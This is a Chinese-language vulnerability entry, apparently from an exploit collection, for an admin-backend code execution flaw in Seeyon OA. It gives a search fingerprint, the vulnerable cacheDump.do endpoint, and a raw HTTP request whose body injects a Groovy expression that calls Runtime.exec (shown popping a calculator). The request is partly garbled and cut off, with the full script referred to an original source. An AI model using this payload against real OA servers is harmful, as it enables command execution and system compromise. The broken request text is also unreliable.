# 致远OAmonitor管理员后台任意代码执行漏洞

- **系统**：致远OA　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="致远互联-OA"`
- **请求**：`POST /seeyon/ctp/sysmgr/monitor/cacheDump.do HTTP/1.1`

**请求体 / payload**
```
此漏洞全版本覆盖，只要拿到超级管理员权限即可
**1、以超级管理员身份访问以下路径/seeyon/ctp/sysmgr/monitor/index.do**
**2、以超级管理员的身份发送如下数据包**
Host:
like Gecko) Chrome/91.0.4472.77 Safari/537.36
Cookie: JSESSIONID=1A38B9081A495DF8B8D92E9A5FB8A2BE; loginPageURL=;
login_locale=en
Content-Type: application/x-www-form-urlencoded
Content-Length: 101
q=groovy&b=partitionManager&m=getPartition&p=100000000000);java.lang.Runtime.getR
untime().exec('calc'
**弹出计算器**
**payload 优化**
POST /seeyon/ctp/sysmgr/monitor/cacheDump.do HTTP/1.1
Host:
like Gecko) Chrome/91.0.4472.77 Safari/537.36
Cookie: JSESSIONID=449220DA58862AB7ACB79A819DB39BB9; loginPa…（脚本共 11093 字，完整版见原文）
```
- **预期**：200　|　—